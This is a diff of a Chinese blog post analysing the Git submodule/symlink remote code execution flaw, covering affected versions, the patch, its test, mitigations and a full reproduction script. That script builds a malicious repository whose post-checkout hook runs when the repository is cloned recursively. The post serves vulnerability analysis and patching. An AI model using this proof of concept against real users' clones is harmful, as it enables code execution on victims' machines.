@@ -48,7 +48,7 @@
 <meta property="og:image" content="http://mamor5409.github.io/posts/6d847069/image-20240521180819704.png">
 <meta property="og:image" content="http://mamor5409.github.io/posts/6d847069/image-20240521180925512.png">
 <meta property="article:published_time" content="2024-05-21T10:02:29.000Z">
-<meta property="article:modified_time" content="2024-05-21T10:16:36.186Z">
+<meta property="article:modified_time" content="2024-05-21T10:16:36.000Z">
 <meta property="article:author" content="Mamor">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://mamor5409.github.io/posts/6d847069/image-20240521180326713.png">
@@ -289,19 +289,28 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><ul>
-<li><p>在开发项目中如果需要想讲两个项目作为独立项目，又想在一个项目中去使用另一个项目，可通过git的子模块来解决这个问题。git 的子模块允许使用一个项目的git仓库时去递归引用另一个项目git仓库的子目录。  一般通过 git submodule命令进行操作 。</p>
-</li>
-<li><p>post-checkout文件是Git中的一种钩子，在运行git clone或git checkout命令后将会被调用。</p>
-</li>
-<li><p>在Windows和Mac系统中 不区分大小写，所以在创建文件目录时创建一个 AA 的目录后将无法创建一个名为 aa 的目录。【这个并没有在分析时体现出来，没有相关代码可供分析，POC是通过修复代码中的测试脚本文件去实现的】</p>
-<p><img src="/posts/6d847069/image-20240521180326713.png"></p>
-</li>
+        <h3 id="前置知识">前置知识</h3>
+<ul>
+<li><p>在开发项目中如果需要想讲两个项目作为独立项目，又想在一个项目中去使用另一个项目，可通过git的子模块来解决这个问题。git
+的子模块允许使用一个项目的git仓库时去递归引用另一个项目git仓库的子目录。
+一般通过 git submodule命令进行操作 。</p></li>
+<li><p>post-checkout文件是Git中的一种钩子，在运行git clone或git
+checkout命令后将会被调用。</p></li>
+<li><p>在Windows和Mac系统中 不区分大小写，所以在创建文件目录时创建一个
+AA 的目录后将无法创建一个名为 aa
+的目录。【这个并没有在分析时体现出来，没有相关代码可供分析，POC是通过修复代码中的测试脚本文件去实现的】</p>
+<p><img src="/posts/6d847069/image-20240521180326713.png"></p></li>
 </ul>
-<h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>  Git是一款免费开源的分布式版本控制系统，支持在多个系统中安装运行，广泛用于协作开发和管理软件项目。在git中提供了许多功能，比如子模块、钩子等，使得git在使用时变得更为灵活。</p>
-<p>  在开发项目中如果需要想讲两个项目作为独立项目，又想在一个项目中去使用另一个项目，可通过git的子模块来解决这个问题。git 的子模块允许使用一个项目的git仓库时去递归引用另一个项目git仓库的子目录。  一般通过 git submodule命令进行添加子模块 。</p>
-<p>  在使用git clone 命令时， 会根据.gitmodules文件自动克隆hook的子模块，子模块中的post-checkout钩子会被触发。未经身份认证的远程攻击者创建带有特殊子模块和符号链接的恶意存储库，当受害者在git clone时将会触发恶意脚本，从而造成远程代码执行，该漏洞可被用于钓鱼或偷毒，但在Windows中的利用条件较为苛刻（需要管理员权限）。</p>
-<h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>仅影响Windows和MAC系统下如下版本：</p>
+<h3 id="漏洞概述">漏洞概述</h3>
+<p>Git是一款免费开源的分布式版本控制系统，支持在多个系统中安装运行，广泛用于协作开发和管理软件项目。在git中提供了许多功能，比如子模块、钩子等，使得git在使用时变得更为灵活。</p>
+<p>在开发项目中如果需要想讲两个项目作为独立项目，又想在一个项目中去使用另一个项目，可通过git的子模块来解决这个问题。git
+的子模块允许使用一个项目的git仓库时去递归引用另一个项目git仓库的子目录。
+一般通过 git submodule命令进行添加子模块 。</p>
+<p>在使用git clone 命令时，
+会根据.gitmodules文件自动克隆hook的子模块，子模块中的post-checkout钩子会被触发。未经身份认证的远程攻击者创建带有特殊子模块和符号链接的恶意存储库，当受害者在git
+clone时将会触发恶意脚本，从而造成远程代码执行，该漏洞可被用于钓鱼或偷毒，但在Windows中的利用条件较为苛刻（需要管理员权限）。</p>
+<h3 id="漏洞影响">漏洞影响</h3>
+<p>仅影响Windows和MAC系统下如下版本：</p>
 <p>git 2.45.0</p>
 <p>git 2.44.0</p>
 <p>git 2.43.* &lt; 2.43.4</p>
@@ -309,27 +318,32 @@
 <p>git 2.41.0</p>
 <p>git 2.40.* &lt; 2.40.2</p>
 <p>git &lt; 2.39.4</p>
-<h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>地址：<a target="_blank" rel="noopener" href="https://github.com/git/git/commit/97065761333fd62db1912d81b489db938d8c991d">https://github.com/git/git/commit/97065761333fd62db1912d81b489db938d8c991d</a></p>
-<p>在补丁更新中 主要变更了两个文件，一个是文件补丁，另一个则为测试脚本。</p>
+<h3 id="补丁分析">补丁分析</h3>
+<p>地址：https://github.com/git/git/commit/97065761333fd62db1912d81b489db938d8c991d</p>
+<p>在补丁更新中
+主要变更了两个文件，一个是文件补丁，另一个则为测试脚本。</p>
 <p><img src="/posts/6d847069/image-20240521180423440.png"></p>
 <p><img src="/posts/6d847069/image-20240521180629016.png"></p>
 <p>在clone_submodule中添加了克隆前进行了判断，如果子模块目录是否存在且为空，如果不为空则会终止。</p>
-<p>新加了一个 dir_contains_only_dotgit()函数，主要作用为 检查目录是否仅包含 .git文件后目录，如果存在其他文件或目录则返回错误。</p>
+<p>新加了一个 dir_contains_only_dotgit()函数，主要作用为
+检查目录是否仅包含
+.git文件后目录，如果存在其他文件或目录则返回错误。</p>
 <p>第二个文件更新则为测试脚本</p>
 <p>在hook子目录中的post-checkout钩子中写入命令，然后将带有post-chechout钩子的hook仓库作为子模块添加到captiain仓库中。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">test_expect_success CASE_INSENSITIVE_FS,SYMLINKS \</span><br><span class="line">    &#x27;submodule paths must not follow symlinks&#x27; &#x27;</span><br><span class="line">    # This is only needed because we want to run this in a self-contained</span><br><span class="line">    # test without having to spin up an HTTP server; However, it would not</span><br><span class="line">    # be needed in a real-world scenario where the submodule is simply</span><br><span class="line">    # hosted on a public site.</span><br><span class="line">    test_config_global protocol.file.allow always &amp;&amp;</span><br><span class="line">    # Make sure that Git tries to use symlinks on Windows</span><br><span class="line">    test_config_global core.symlinks true &amp;&amp;</span><br><span class="line">    tell_tale_path=&quot;$PWD/tell.tale&quot; &amp;&amp;</span><br><span class="line">    git init hook &amp;&amp;</span><br><span class="line">    (</span><br><span class="line">        cd hook &amp;&amp;</span><br><span class="line">        mkdir -p y/hooks &amp;&amp;</span><br><span class="line">        write_script y/hooks/post-checkout &lt;&lt;-EOF &amp;&amp;</span><br><span class="line">        echo HOOK-RUN &gt;&amp;2</span><br><span class="line">        echo hook-run &gt;&quot;$tell_tale_path&quot;</span><br><span class="line">        EOF</span><br><span class="line">        git add y/hooks/post-checkout &amp;&amp;</span><br><span class="line">        test_tick &amp;&amp;</span><br><span class="line">        git commit -m post-checkout</span><br><span class="line">    ) &amp;&amp;</span><br><span class="line">    hook_repo_path=&quot;$(pwd)/hook&quot; &amp;&amp;</span><br><span class="line">    git init captain &amp;&amp;</span><br><span class="line">    (</span><br><span class="line">        cd captain &amp;&amp;</span><br><span class="line">        git submodule add --name x/y &quot;$hook_repo_path&quot; A/modules/x &amp;&amp;</span><br><span class="line">        test_tick &amp;&amp;</span><br><span class="line">        git commit -m add-submodule &amp;&amp;</span><br><span class="line">        printf .git &gt;dotgit.txt &amp;&amp;</span><br><span class="line">        git hash-object -w --stdin &lt;dotgit.txt &gt;dot-git.hash &amp;&amp;</span><br><span class="line">        printf &quot;120000 %s 0\ta\n&quot; &quot;$(cat dot-git.hash)&quot; &gt;index.info &amp;&amp;</span><br><span class="line">        git update-index --index-info &lt;index.info &amp;&amp;</span><br><span class="line">        test_tick &amp;&amp;</span><br><span class="line">        git commit -m add-symlink</span><br><span class="line">    ) &amp;&amp;</span><br><span class="line">    test_path_is_missing &quot;$tell_tale_path&quot; &amp;&amp;</span><br><span class="line">    test_must_fail git clone --recursive captain hooked 2&gt;err &amp;&amp;</span><br><span class="line">    grep &quot;directory not empty&quot; err &amp;&amp;</span><br><span class="line">    test_path_is_missing &quot;$tell_tale_path&quot;</span><br><span class="line">&#x27;</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><img src="/posts/6d847069/image-20240521180803937.png"></p>
-<p>Windows下在管理员权限下通过Git Bash可复现此漏洞【需要管理员权限！】</p>
+<h3 id="漏洞复现">漏洞复现</h3>
+<p><img src="/posts/6d847069/image-20240521180803937.png"></p>
+<p>Windows下在管理员权限下通过Git
+Bash可复现此漏洞【需要管理员权限！】</p>
 <p><img src="/posts/6d847069/image-20240521180819704.png"></p>
-<p>POC来源：<a target="_blank" rel="noopener" href="https://github.com/amalmurali47/git_rce">https://github.com/amalmurali47/git_rce</a></p>
+<p>POC来源：https://github.com/amalmurali47/git_rce</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line"># Set Git configuration options</span><br><span class="line"></span><br><span class="line"># 允许使用file协议</span><br><span class="line">git config --global protocol.file.allow always</span><br><span class="line"># 启用对符合链接的支持</span><br><span class="line">git config --global core.symlinks true</span><br><span class="line"># optional, but I added it to avoid the warning message</span><br><span class="line"># 设置默认分支名 main 避免出现告警信息</span><br><span class="line">git config --global init.defaultBranch main </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 定义标志文件路径</span><br><span class="line"># Define the tell-tale path</span><br><span class="line">tell_tale_path=&quot;$PWD/tell.tale&quot;</span><br><span class="line"></span><br><span class="line"># 初始化hook仓库</span><br><span class="line"># Initialize the hook repository</span><br><span class="line">git init hook</span><br><span class="line">cd hook</span><br><span class="line">mkdir -p y/hooks</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 编写恶意hook代码</span><br><span class="line"># Write the malicious code to a hook</span><br><span class="line">cat &gt; y/hooks/post-checkout &lt;&lt;EOF</span><br><span class="line">#!/bin/bash</span><br><span class="line">echo &quot;amal_was_here&quot; &gt; /tmp/pwnd</span><br><span class="line">calc.exe</span><br><span class="line">open -a Calculator.app</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"># 设置hook文件的可执行权限</span><br><span class="line"># Make the hook executable: important</span><br><span class="line">chmod +x y/hooks/post-checkout</span><br><span class="line"></span><br><span class="line"># 添加并提交hook</span><br><span class="line">git add y/hooks/post-checkout</span><br><span class="line">git commit -m &quot;post-checkout&quot;</span><br><span class="line"></span><br><span class="line">cd ..</span><br><span class="line"></span><br><span class="line"># 定义hook仓库路径</span><br><span class="line"># Define the hook repository path</span><br><span class="line">hook_repo_path=&quot;$(pwd)/hook&quot;</span><br><span class="line"></span><br><span class="line"># 初始化captain仓库</span><br><span class="line"># Initialize the captain repository</span><br><span class="line">git init captain</span><br><span class="line">cd captain</span><br><span class="line"></span><br><span class="line"># 添加 hook仓库作为 子模块 路径为 A/modulesx 名称为 x/y</span><br><span class="line">git submodule add --name x/y &quot;$hook_repo_path&quot; A/modules/x</span><br><span class="line"># 提交子模块更改</span><br><span class="line">git commit -m &quot;add-submodule&quot;</span><br><span class="line"></span><br><span class="line"># Create a symlink</span><br><span class="line"># 创建符合链接</span><br><span class="line">printf &quot;.git&quot; &gt; dotgit.txt</span><br><span class="line"># 计算文件的哈希值</span><br><span class="line">git hash-object -w --stdin &lt; dotgit.txt &gt; dot-git.hash</span><br><span class="line"># 准备索引信息</span><br><span class="line">printf &quot;120000 %s 0\ta\n&quot; &quot;$(cat dot-git.hash)&quot; &gt; index.info</span><br><span class="line"># 更新git索引</span><br><span class="line">git update-index --index-info &lt; index.info</span><br><span class="line"># 提交更改</span><br><span class="line">git commit -m &quot;add-symlink&quot;</span><br><span class="line">cd ..</span><br><span class="line"></span><br><span class="line"># 克隆仓库</span><br><span class="line">git clone --recursive captain hooked</span><br></pre></td></tr></table></figure>
-
-<p>运行<code>git clone --recursive git@github.com:10cks/captain.git</code> 即可远程复现此漏洞</p>
+<p>运行<code>git clone --recursive git@github.com:10cks/captain.git</code>
+即可远程复现此漏洞</p>
 <p><img src="/posts/6d847069/image-20240521180925512.png"></p>
-<h3 id="修复措施"><a href="#修复措施" class="headerlink" title="修复措施"></a>修复措施</h3><h4 id="升级版本"><a href="#升级版本" class="headerlink" title="升级版本"></a>升级版本</h4><p>目前官方已有可更新版本，建议受影响用户升级至最新版本：</p>
+<h3 id="修复措施">修复措施</h3>
+<h4 id="升级版本">升级版本</h4>
+<p>目前官方已有可更新版本，建议受影响用户升级至最新版本：</p>
 <p>git 2.45.* &gt;= 2.45.1</p>
 <p>git 2.44.* &gt;= 2.44.1</p>
 <p>git 2.43.* &gt;= 2.43.4</p>
@@ -338,13 +352,15 @@
 <p>git 2.40.* &gt;= 2.40.2</p>
 <p>git &gt;= 2.39.4</p>
 <p>下载地址：</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/git/git/tags">https://github.com/git/git/tags</a></p>
-<h4 id="缓解方案"><a href="#缓解方案" class="headerlink" title="缓解方案"></a>缓解方案</h4><p>1.在Git中禁用符号链接（<code> git config --global core.symlinks false</code>）</p>
+<p>https://github.com/git/git/tags</p>
+<h4 id="缓解方案">缓解方案</h4>
+<p>1.在Git中禁用符号链接（<code>git config --global core.symlinks false</code>）</p>
 <p>2.避免在不受信任的来源克隆存储库</p>
-<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a target="_blank" rel="noopener" href="https://amalmurali.me/posts/git-rce/">https://amalmurali.me/posts/git-rce/</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/git/git/commit/97065761333fd62db1912d81b489db938d8c991d">https://github.com/git/git/commit/97065761333fd62db1912d81b489db938d8c991d</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/amalmurali47/git_rce">https://github.com/amalmurali47/git_rce</a></p>
-<p><a target="_blank" rel="noopener" href="https://git-scm.com/book/zh/v2/%E8%87%AA%E5%AE%9A%E4%B9%89-Git-Git-%E9%92%A9%E5%AD%90">https://git-scm.com/book/zh/v2/%E8%87%AA%E5%AE%9A%E4%B9%89-Git-Git-%E9%92%A9%E5%AD%90</a></p>
+<h3 id="references">References</h3>
+<p>https://amalmurali.me/posts/git-rce/</p>
+<p>https://github.com/git/git/commit/97065761333fd62db1912d81b489db938d8c991d</p>
+<p>https://github.com/amalmurali47/git_rce</p>
+<p><a target="_blank" rel="noopener" href="https://git-scm.com/book/zh/v2/自定义-Git-Git-钩子">https://git-scm.com/book/zh/v2/%E8%87%AA%E5%AE%9A%E4%B9%89-Git-Git-%E9%92%A9%E5%AD%90</a></p>
 
     </div>
 
@@ -470,7 +486,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">1.</span> <span class="nav-text">前置知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="nav-number">2.</span> <span class="nav-text">漏洞概述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D"><span class="nav-number">3.</span> <span class="nav-text">漏洞影响</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90"><span class="nav-number">4.</span> <span class="nav-text">补丁分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">5.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D%E6%8E%AA%E6%96%BD"><span class="nav-number">6.</span> <span class="nav-text">修复措施</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8D%87%E7%BA%A7%E7%89%88%E6%9C%AC"><span class="nav-number">6.1.</span> <span class="nav-text">升级版本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BC%93%E8%A7%A3%E6%96%B9%E6%A1%88"><span class="nav-number">6.2.</span> <span class="nav-text">缓解方案</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#References"><span class="nav-number">7.</span> <span class="nav-text">References</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">1.</span> <span class="nav-text">前置知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="nav-number">2.</span> <span class="nav-text">漏洞概述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D"><span class="nav-number">3.</span> <span class="nav-text">漏洞影响</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90"><span class="nav-number">4.</span> <span class="nav-text">补丁分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">5.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D%E6%8E%AA%E6%96%BD"><span class="nav-number">6.</span> <span class="nav-text">修复措施</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8D%87%E7%BA%A7%E7%89%88%E6%9C%AC"><span class="nav-number">6.1.</span> <span class="nav-text">升级版本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BC%93%E8%A7%A3%E6%96%B9%E6%A1%88"><span class="nav-number">6.2.</span> <span class="nav-text">缓解方案</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#references"><span class="nav-number">7.</span> <span class="nav-text">References</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -486,7 +502,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">193</span>
+          <span class="site-state-item-count">194</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -534,7 +550,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -548,7 +564,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">19:10</span>
+    <span title="站点阅读时长">19:09</span>
 </div>
 
 <!--
@@ -559,7 +575,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共266.3k字</span>
+  <span class="post-count">博客全站共267.3k字</span>
 </div>
 -->
         
@@ -699,6 +715,63 @@ window.addEventListener('pjax:success', () => {
 
     <div id="pjax">
   
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
